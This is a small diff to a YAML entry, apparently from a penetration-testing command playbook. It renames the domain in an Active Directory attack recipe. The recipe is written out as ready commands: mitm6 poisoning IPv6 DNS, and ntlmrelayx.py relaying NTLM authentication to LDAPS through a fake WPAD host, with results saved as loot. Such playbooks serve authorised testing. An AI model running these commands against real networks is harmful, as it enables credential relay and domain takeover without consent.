@@ -5,10 +5,10 @@ commands:
   - have: No_Creds
     cmd: |
       # Terminal 1 — poison IPv6 DNS
-      mitm6 -d senshu.sh
+      mitm6 -d senshu.local
 
       # Terminal 2 — relay to LDAP (results saved in loot/)
-      ntlmrelayx.py -6 -t ldaps://10.10.10.27 -wh fakewpad.senshu.sh -l loot
+      ntlmrelayx.py -6 -t ldaps://10.10.10.27 -wh fakewpad.senshu.local -l loot
 phase:
   - Exploitation
 target_os:
